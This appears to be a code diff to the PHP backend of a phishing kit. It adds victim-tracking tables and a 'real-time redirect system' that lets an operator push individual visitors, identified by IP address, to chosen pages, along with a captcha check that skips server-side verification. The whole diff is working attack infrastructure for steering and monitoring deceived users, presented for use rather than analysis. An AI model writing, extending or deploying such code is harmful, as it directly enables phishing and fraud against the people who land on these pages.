@@ -31,6 +31,27 @@ try {
     )";
     $db->exec($create_victims_table);
     
+    // Create redirect_commands table with expiration and IPv4 support
+    $create_redirect_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
+        id SERIAL PRIMARY KEY,
+        command VARCHAR(50) NOT NULL,
+        target TEXT NOT NULL,
+        victim_ip VARCHAR(45) NOT NULL,
+        expires_at TIMESTAMP DEFAULT (NOW() + INTERVAL '30 seconds'),
+        executed BOOLEAN DEFAULT FALSE,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )";
+    $db->exec($create_redirect_table);
+    
+    // Create case_settings table
+    $create_case_table = "CREATE TABLE IF NOT EXISTS case_settings (
+        id SERIAL PRIMARY KEY,
+        setting_name VARCHAR(100) UNIQUE NOT NULL,
+        setting_value TEXT NOT NULL,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )";
+    $db->exec($create_case_table);
+    
     // FIX: Ensure ALL columns exist in victims table
     $columns_to_check = ['country', 'isp', 'last_activity', 'status', 'page_visited'];
     foreach ($columns_to_check as $column) {
@@ -110,70 +131,40 @@ try {
 }
 // ==================== VICTIM TRACKING END ====================
 
+// ==================== REAL-TIME REDIRECT SYSTEM START ====================
 try {
     $database = new Database();
     $db = $database->getConnection();
 
-    // Create redirect_commands table if not exists
-    $create_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
-        id SERIAL PRIMARY KEY,
-        command VARCHAR(50) NOT NULL,
-        target TEXT NOT NULL,
-        victim_id INTEGER DEFAULT NULL,
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-    )";
-    $db->exec($create_table);
+    // Clean up expired redirect commands
+    $cleanup_query = "DELETE FROM redirect_commands WHERE expires_at < NOW() OR executed = TRUE";
+    $db->exec($cleanup_query);
 
-    // FIX: Ensure victim_id column exists
-    try {
-        $check_column = $db->query("SELECT column_name FROM information_schema.columns WHERE table_name = 'redirect_commands' AND column_name = 'victim_id'");
-        if ($check_column->rowCount() == 0) {
-            $alter_table = "ALTER TABLE redirect_commands ADD COLUMN victim_id INTEGER DEFAULT NULL";
-            $db->exec($alter_table);
-            error_log("Added victim_id column to redirect_commands table");
-        }
-    } catch (Exception $e) {
-        error_log("Column check error: " . $e->getMessage());
-    }
-
-    // Check for specific victim redirect first
+    // Check for LIVE redirect commands (only unexpired, unexecuted for this IP)
     $victim_ip = $_SERVER['REMOTE_ADDR'];
-    $victim_query = "SELECT rc.target 
-                    FROM redirect_commands rc 
-                    JOIN victims v ON rc.victim_id = v.id 
-                    WHERE rc.command = 'redirect' 
-                    AND v.ip_address = :ip 
-                    AND rc.created_at > NOW() - INTERVAL '5 minutes'
-                    ORDER BY rc.created_at DESC 
-                    LIMIT 1";
-    $victim_stmt = $db->prepare($victim_query);
-    $victim_stmt->execute([':ip' => $victim_ip]);
-    $victim_redirect = $victim_stmt->fetch(PDO::FETCH_ASSOC);
+    $redirect_query = "SELECT target FROM redirect_commands 
+                      WHERE victim_ip = :ip
+                      AND command = 'redirect' 
+                      AND executed = FALSE 
+                      AND expires_at > NOW()
+                      ORDER BY created_at DESC 
+                      LIMIT 1";
+    $redirect_stmt = $db->prepare($redirect_query);
+    $redirect_stmt->execute([':ip' => $victim_ip]);
+    $redirect = $redirect_stmt->fetch(PDO::FETCH_ASSOC);
 
-    if ($victim_redirect) {
-        $redirect_target = trim($victim_redirect['target']);
+    if ($redirect) {
+        $redirect_target = trim($redirect['target']);
         $current_page = basename($_SERVER['PHP_SELF']);
         
         // Perform redirect if target is valid AND NOT the current page
         if ($redirect_target && $redirect_target !== 'None' && $redirect_target !== $current_page) {
-            error_log("Victim redirect: $victim_ip -> $redirect_target");
-            header("Location: $redirect_target");
-            exit;
-        }
-    }
-
-    // If no specific victim redirect, check global redirect
-    $query = "SELECT target FROM redirect_commands WHERE command = 'redirect' AND victim_id IS NULL ORDER BY created_at DESC LIMIT 1";
-    $stmt = $db->query($query);
-    $redirect_target = $stmt->fetch(PDO::FETCH_ASSOC);
-
-    if ($redirect_target) {
-        $redirect_target = trim($redirect_target['target']);
-        $current_page = basename($_SERVER['PHP_SELF']);
-        
-        // Perform redirect if target is valid AND NOT the current page
-        if ($redirect_target && $redirect_target !== 'None' && $redirect_target !== $current_page) {
-            error_log("Global redirect to: $redirect_target");
+            // Mark as executed
+            $mark_executed = "UPDATE redirect_commands SET executed = TRUE WHERE target = :target AND victim_ip = :ip AND executed = FALSE";
+            $mark_stmt = $db->prepare($mark_executed);
+            $mark_stmt->execute([':target' => $redirect_target, ':ip' => $victim_ip]);
+            
+            error_log("Real-time redirect: $victim_ip -> $redirect_target");
             header("Location: $redirect_target");
             exit;
         }
@@ -182,6 +173,7 @@ try {
     // Silently continue if database fails
     error_log("Database error in index.php: " . $e->getMessage());
 }
+// ==================== REAL-TIME REDIRECT SYSTEM END ====================
 
 // Handle hCaptcha verification - Simplified version without server-side verification
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['h-captcha-response'])) {
